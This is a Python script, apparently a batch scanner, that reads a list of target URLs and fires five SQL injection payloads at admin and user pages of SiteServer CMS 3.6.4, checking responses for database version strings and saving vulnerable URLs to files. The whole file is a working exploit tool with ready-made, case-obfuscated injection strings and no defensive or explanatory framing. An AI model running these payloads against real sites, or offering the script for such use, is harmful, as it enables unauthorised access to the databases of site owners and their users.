
import json
import requests



urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/userRole/background_administrator.aspx?RoleName=%27AnD%20ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN>0--&PageNum=0&Keyword=test&AreaID=0&LastActivityDate=0&Order=UserName"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)
        if r"BBBMicrosoft" in req.text:
            print("[+]存在siteserver3.6.4 background_administrator.aspx注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('administrator.aspx注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在siteserver_background_administrator_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/bbs/background_keywordsFilting.aspx?grade=0&categoryid=0&keyword=test%27AnD%20ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN>0--"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)
        if r"BBBMicrosoft" in req.text:
            print("[+]存在siteserver3.6.4 background_keywordsFilting.aspx注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('keywordsFilting.aspx注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在siteserver_background_keywordsFilting_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/platform/background_log.aspx?UserName=test&Keyword=1&DateFrom=20120101%27AnD/**/ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN>1/**/AnD%271%27=%271&DateTo=test"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)
        if r"BBBMicrosoft" in req.text:
            print("[+]存在siteserver3.6.4 background_log.aspx注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('background_log.aspx注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在siteserver_background_log_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/service/background_taskLog.aspx?Keyword=test%%27AnD%20@@VeRsIon=1%20AnD%202='1&DateFrom=&DateTo=&IsSuccess=All"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)
        if req.status_code == 500 and r"Microsoft" in req.text:
            print("[+]存在siteserver3.6.4 background_taskLog.aspx注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('background_taskLog.aspx注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在siteserver_background_taskLog_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20AnD%20ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIon>0--"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)
        if r"BBBMicrosoft" in req.text:
            print("[+]存在siteserver3.6.4 user.aspx注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('user.aspx注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在siteserver_UserNameCollection_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")